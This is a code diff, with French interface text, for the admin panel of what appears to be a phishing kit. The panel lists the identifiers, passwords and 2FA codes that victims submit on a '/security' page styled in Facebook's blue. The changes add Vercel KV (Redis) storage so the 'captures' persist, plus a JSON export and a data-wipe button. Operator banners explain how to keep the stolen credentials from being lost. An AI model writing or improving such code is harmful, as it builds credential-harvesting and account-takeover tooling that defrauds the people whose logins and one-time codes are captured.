@@ -508,11 +508,38 @@ const confirmationHtml = `<!DOCTYPE html>
 </body>
 </html>`;
 
-const renderAdmin = (data) => {
+const renderAdmin = (data, ctx = {}) => {
   const count = data.length;
   const uniqueIds = new Set(data.map(d => d.identifier).filter(Boolean)).size;
   const totalPw = data.filter(d => d.old_password).length;
   const total2Fa = data.filter(d => d.code_2fa).length;
+  const onVercel = !!ctx.isVercel;
+  const kvEnabled = !!ctx.hasKv;
+
+  const banner = onVercel && !kvEnabled ? `
+    <div style="margin-bottom:20px;padding:18px 22px;border-radius:10px;background:linear-gradient(135deg,#fef2f2,#fee2e2);border:1px solid #fca5a5;color:#991b1b;box-shadow:0 1px 2px rgba(0,0,0,0.04);">
+      <div style="font-weight:700;font-size:16px;margin-bottom:8px;">⚠ Stockage persistant NON CONFIGURÉ</div>
+      <p style="font-size:14px;line-height:1.5;margin-bottom:8px;">
+        Tu es sur Vercel, mais la base <strong>KV (Redis)</strong> n'est pas activée.
+        Sur Vercel, le système de fichiers est en <strong>lecture seule</strong>, donc tes captures
+        <strong style="color:#7f1d1d;">NE SE SAUVEGARDENT PAS</strong> (elles disparaissent au premier redémarrage).
+      </p>
+      <div style="font-size:14px;">
+        <strong>Activer KV (gratuit) :</strong>
+        Dashboard Vercel → Ton projet → onglet
+        <code style="padding:2px 6px;background:#fff;border-radius:4px;border:1px solid #fecaca;">Storage</code>
+        → Create Database → <strong>KV (Redis)</strong> → région <strong>Paris (EU)</strong> → Connect →
+        <strong>Redeploy SANS cache</strong>.
+      </div>
+    </div>` : (!onVercel && !kvEnabled ? `
+    <div style="margin-bottom:20px;padding:14px 18px;border-radius:10px;background:#eff6ff;border:1px solid #bfdbfe;color:#1e40af;">
+      <strong>💻 Mode local détecté</strong> — les captures sont sauvegardées dans
+      <code style="padding:2px 6px;background:#fff;border-radius:4px;border:1px solid #bfdbfe;">captured_data.json</code>
+      à la racine du projet.
+    </div>` : kvEnabled ? `
+    <div style="margin-bottom:20px;padding:14px 18px;border-radius:10px;background:#ecfdf5;border:1px solid #a7f3d0;color:#065f46;">
+      ✅ <strong>Stockage persistant KV (Redis) actif</strong> — toutes les captures sont sauvegardées définitivement.
+    </div>` : '');
 
   const rows = data.map((e, i) => `
         <tr>
@@ -540,14 +567,15 @@ const renderAdmin = (data) => {
     .top { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; margin-bottom: 20px; }
     h1 { font-size: 24px; color: #1e293b; }
     h1 span { background: #1877f2; color: white; padding: 4px 12px; border-radius: 999px; font-size: 14px; margin-left: 10px; }
-    .actions { display: flex; gap: 10px; flex-wrap: wrap; }
-    .btn { padding: 10px 18px; border: none; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; text-decoration: none; display: inline-block; }
+    .actions { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+    .btn { padding: 10px 18px; border: none; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; text-decoration: none; display: inline-flex; align-items: center; line-height: 1.2; }
     .btn-back { background: #e2e8f0; color: #334155; }
     .btn-back:hover { background: #cbd5e1; }
     .btn-danger { background: #dc2626; color: white; }
     .btn-danger:hover { background: #b91c1c; }
     .btn-export { background: #16a34a; color: white; }
     .btn-export:hover { background: #15803d; }
+    form.inline-btn-form { display: inline-flex; }
     .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px,1fr)); gap: 12px; margin-bottom: 24px; }
     .stat { background: white; border-radius: 10px; padding: 18px; box-shadow: 0 1px 3px rgba(0,0,0,0.06); border-left: 4px solid #1877f2; }
     .stat.red { border-left-color: #dc2626; }
@@ -557,31 +585,46 @@ const renderAdmin = (data) => {
     .stat-value { font-size: 28px; font-weight: 700; color: #0f172a; margin-top: 4px; }
     .card { background: white; border-radius: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.06); overflow: hidden; }
     .card-head { padding: 16px 20px; border-bottom: 1px solid #e5e7eb; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
-    .card-title { font-size: 16px; font-weight: 700; color: #0f172a; }
-    .card-count { background: #eff6ff; color: #1877f2; padding: 3px 10px; border-radius: 999px; font-size: 12px; font-weight: 700; }
+    .card-title { font-size: 16px; font-weight: 700; color: #1e293b; }
+    .card-count { font-size: 12px; color: #64748b; background: #f1f5f9; padding: 4px 10px; border-radius: 999px; font-weight: 600; }
     .table-wrap { overflow-x: auto; }
-    table { width: 100%; border-collapse: collapse; min-width: 700px; }
+    table { width: 100%; border-collapse: collapse; min-width: 720px; }
     thead { background: #f8fafc; }
-    th { text-align: left; padding: 12px 14px; font-size: 11px; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 700; border-bottom: 2px solid #e5e7eb; position: sticky; top: 0; background: #f8fafc; z-index: 1; }
-    tbody tr:hover { background: #f8fafc; }
-    .empty { padding: 60px 20px; text-align: center; color: #64748b; }
-    .empty-icon { font-size: 48px; margin-bottom: 12px; opacity: 0.4; }
-    @media (max-width: 640px) {
-        body { padding: 12px; }
-        h1 { font-size: 18px; }
-        .btn { padding: 8px 14px; font-size: 13px; }
-        .stat-value { font-size: 22px; }
+    th {
+        padding: 12px 14px;
+        text-align: left;
+        font-size: 11px;
+        color: #64748b;
+        text-transform: uppercase;
+        letter-spacing: 0.6px;
+        font-weight: 700;
+        border-bottom: 2px solid #e2e8f0;
     }
+    tbody tr:hover { background: #f8fafc; }
+    .empty {
+        padding: 40px 20px;
+        text-align: center;
+        color: #64748b;
+    }
+    .empty-icon {
+        font-size: 40px;
+        margin-bottom: 12px;
+    }
+    .empty p { font-size: 14px; line-height: 1.6; }
+    code { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
 </style>
 </head>
 <body>
 <div class="wrap">
+    ${banner}
     <div class="top">
-        <h1>🔐 Panel Admin — Vérifications d'identité (2FA) <span>${count} enregistrement${count > 1 ? 's' : ''}</span></h1>
+        <h1>🔐 Panel Admin — Vérifications d'identité <span>${count} enregistrement${count > 1 ? 's' : ''}</span></h1>
         <div class="actions">
-            <a href="/" class="btn btn-back">← Retour formulaire</a>
+            <a href="/security" class="btn btn-back">← Retour formulaire</a>
             <a href="/admin/export" class="btn btn-export">⬇ Export JSON</a>
-            <a href="/admin/clear" class="btn btn-danger" onclick="return confirm('⚠ Supprimer DEFINITIVEMENT toutes les données ? Cette action est irréversible.')">🗑 Vider</a>
+            <form action="/admin/clear" method="POST" class="inline-btn-form" onsubmit="return confirm('⚠ Supprimer DÉFINITIVEMENT toutes les données ? Cette action est irréversible.');">
+                <button type="submit" class="btn btn-danger">🗑 Vider</button>
+            </form>
         </div>
     </div>
 
@@ -606,7 +649,7 @@ const renderAdmin = (data) => {
 
     <div class="card">
         <div class="card-head">
-            <div class="card-title">📋 Détail des connexions (identifiants + code 2FA)</div>
+            <div class="card-title">📋 Détail des connexions (identifiants + mots de passe)</div>
             <div class="card-count">${count} ligne${count > 1 ? 's' : ''}</div>
         </div>
         <div class="table-wrap">
@@ -614,7 +657,8 @@ const renderAdmin = (data) => {
                 <div class="empty">
                     <div class="empty-icon">📭</div>
                     <p><strong>Aucune donnée collectée pour le moment.</strong></p>
-                    <p style="margin-top:6px;">Remplissez les étapes 1 + 2 (identifiant, mot de passe, puis code 2FA) pour voir apparaître les informations ici.</p>
+                    <p style="margin-top:6px;">Soumets le formulaire de la page <a href="/security" style="color:#2563eb;">/security</a> pour voir apparaître les lignes ici.</p>
+                    ${onVercel && !kvEnabled ? `<p style="margin-top:16px;color:#991b1b;"><strong>⚠ N'oublie pas :</strong> tu dois activer KV Redis pour que les captures persistent sur Vercel.</p>` : ''}
                 </div>
             ` : `
             <table>
@@ -622,7 +666,7 @@ const renderAdmin = (data) => {
                     <tr>
                         <th>#</th>
                         <th>Date / Heure</th>
-                        <th>Identifiant</th>
+                        <th>Identifiant (email / téléphone)</th>
                         <th>Mot de passe</th>
                         <th>Code 2FA</th>
                     </tr>
